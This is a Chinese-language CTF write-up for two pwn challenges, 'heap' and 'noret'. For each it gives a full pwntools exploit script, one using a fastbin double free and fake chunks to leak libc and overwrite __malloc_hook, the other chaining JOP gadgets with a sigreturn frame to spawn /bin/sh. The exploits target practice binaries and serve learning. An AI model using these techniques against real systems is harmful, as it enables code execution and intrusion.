---
draft: false
---

主要是些当时没做出来或者忙着陪对象打泰拉瑞亚没空看的题

### heap

没有show()，需要想办法泄露libc地址

最开始我想的是既然没有show，可以想办法打stdout泄露libc，但是该方法需要将unsorted bin中的main_arena+88通过overlap进入到fastbin中，由于这道题只有UAF，我没想到怎么能够实现

后来想能不能通过double free劫持got表通过改free为puts来泄露libc，但是由于fastbin malloc对size的检查（got表前没有自然生成的可用size）于是作罢

真正的解法是利用程序提供的对name的打印泄露libc

想了想我做堆题还是太刻板经验太少，以至于这样一道简单的堆题都没能打掉。注意到对name的打印本应是常规操作。

通过修改chunk size将其free进unsorted bin中我也没能想到，复现的过程也踩了一些坑。

```python
from pwn import *  
context(arch='amd64', os='linux', log_level='debug')  
  
binary_path = './pwn'  
gdb_script = "\n"
gdb_script += "b *0x000000000040089e\n"   
gdb_script += "c\n"  
domain = "node1.tgctf.woooo.tech" 
port = 30526
global io, gdb_io  
elf = ELF(binary_path)  
libc = ELF("libc.so.6")
  
  
def connect(isLocal, isGDB, isIO):  
    if not isLocal:  
        io = remote(domain, port)  
        return io  
    elif isGDB:  
        if isIO:  
            io = process(binary_path)  
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)  
            return io, gdb_io  
        else:  
            io = gdb.debug(binary_path, gdb_script)  
            return io  
    else:  
        io = process(binary_path)  
        return io  
    
def new(size, content):
    io.sendlineafter(b'exit', b'1')  
    io.sendlineafter(b'size?', str(size))  
    io.sendafter(b'else?', content)
    io.recvuntil(b'good!\n')

def delete(index):
    io.sendlineafter(b'exit', b'2')  
    io.sendlineafter(b'Do you want delete?', str(index))  
    io.recvuntil(b'finish\n')
    
def change(content):
    io.sendlineafter(b'exit', b'3')
    io.sendafter(b"your name", content)
    
    
def attack(io):  
    
    name = 0x6020c0
    
    payload = p64(0) + p64(0x31) + b'\x00'*0x80 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x21) 
    #在name处伪造堆块 free()会检查nextchunk的nextsize，也要做好伪造
    #这一次free跟以前做的题不同之处在于：size大于fast_max_size，所以会向上向下合并。fakechunk自身size0x1避免向上合并，nextchunk的nextchunksize0x1避免向下合并
    #所以不仅要伪造nextchunk，还要伪造好nextchunk的nextchunk，否则会报错
    io.sendlineafter("What's your name?", payload)
    new(0x20, cyclic(0x20)) #0
    new(0x20, cyclic(0x20)) #1
    new(0x20, cyclic(0x20)) #2 防合并
    delete(0) #double free
    delete(1) 
    delete(0)
    new(0x20, p64(name)) #3
    new(0x20,cyclic(0x20)) #4
    new(0x20, p64(name)) #5
    new(0x20, cyclic(0x20)) #6
    change(p64(0) + p64(0x91))
    delete(6)
    change(b"A"*0x10)
    io.recvuntil(b"Ah, right! nice to see you "+b'A'*0x10)
    leak_addr = u64(io.recv(6).ljust(8, b"\x00"))
    log.success("leak_addr: " + hex(leak_addr))
    malloc_hook = leak_addr - 0x68
    libc_base = malloc_hook - libc.sym["__malloc_hook"]
    ogg = libc_base + 0x4527a
    change(p64(0)+p64(0x61))
    new(0x60, cyclic(0x60)) #7
    #修改fakechunk的size，重新malloc回来，使其不影响到后续攻击
    #否则会报错malloc():memory corruption
    #应该是该chunk依然在unsorted bin中，后续申请chunk时会检索该堆块进行切割，但是其size头被我们破坏于是报错
    new(0x60, cyclic(0x60))#8
    new(0x60, cyclic(0x60))#9
    new(0x60, cyclic(0x60))#10 防合并
    delete(8)
    delete(9)
    delete(8)
    new(0x60, p64(malloc_hook-0x23))
    new(0x60, cyclic(0x60))#10
    new(0x60, p64(malloc_hook-0x23))#11
    new(0x60, b'\x11'*0x13 + p64(ogg))#12
    new(0x20,cyclic(0x20)) #trigger malloc
    io.interactive()


if __name__ == '__main__':  
    io = connect(True, True, False)
    attack(io)
```

### noret

JOP + SROP 

此处可对比setcontext的类SROP利用：

- 正宗的SROP：不需要泄露Libc，但是要能够设置rax为0xf调用sys_sigreturn
- setcontext SROP：需要泄露libc从而劫持到setcontext

共性是都需要大容量栈空间，如SROP的sigframe就有0xf8大小

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

binary_path = './pwn'
gdb_script = "\n"
gdb_script += "b *0x4010e0\n"
gdb_script += "c\n"
domain = ""
port = 0
global io, gdb_io
elf = ELF(binary_path)
#libc = ELF("")


def connect(isLocal, isGDB, isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
            return io, gdb_io
        else:
            io = gdb.debug(binary_path, gdb_script)
            return io
    else:
        io = process(binary_path)
        return io


def attack(io):
    
    payload = p8(0x32) + p64(0x4010cb) + p32(0x40219c)
    io.sendafter(">", payload)
    
    pop_rsp_rdi_rcx_rdx_jmp_rdi_1 = 0x40100f
    pop_rdi_rcx_rdx_jmp_rdi_1 = 0x401010
    add_rax_rdx_jmp_rcx = 0x401024
    syscall = 0x4010e0
    
    payload = flat(
        p64(pop_rsp_rdi_rcx_rdx_jmp_rdi_1), #先做一个栈迁移到已知位置
        p64(0x40219c+9), #rsp
        p64(0x0), #rdi
        p64(0x0), #rcx
        p64(0x0), #rdx
    )
    
    payload = cyclic(0x108-0x8) + payload
    io.sendlineafter("Submit your feedback", payload)
    pause()

    base = 0x4020bd+0x100
    bin_sh = base+0x8*8
    
    sigFrame = SigreturnFrame()
    sigFrame.rax = 59
    sigFrame.rdi = bin_sh
    sigFrame.rsi = 0
    sigFrame.rdx = 0
    sigFrame.rip = syscall
    payload = flat(
        p64(base+0x8*5-1), #rdi syscall
        p64(0), #rcx
        p64(0), #rdx
    )
    payload += bytes(sigFrame)[0:0xe8]
    payload += flat(
        p64(pop_rdi_rcx_rdx_jmp_rdi_1),
        p64(base+0x8*6-1), #rdi 
        p64(base+0x8*7), #rcx
        p64(0xFFFFFFFFFFFFFFF2), #rdx
        p64(0x4020bd), #rsp
        #data
        p64(syscall), 
        p64(add_rax_rdx_jmp_rcx),
        p64(pop_rsp_rdi_rcx_rdx_jmp_rdi_1),
        b'/bin/sh\x00'
    )
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    io = connect(True, True, False)
    attack(io)
```


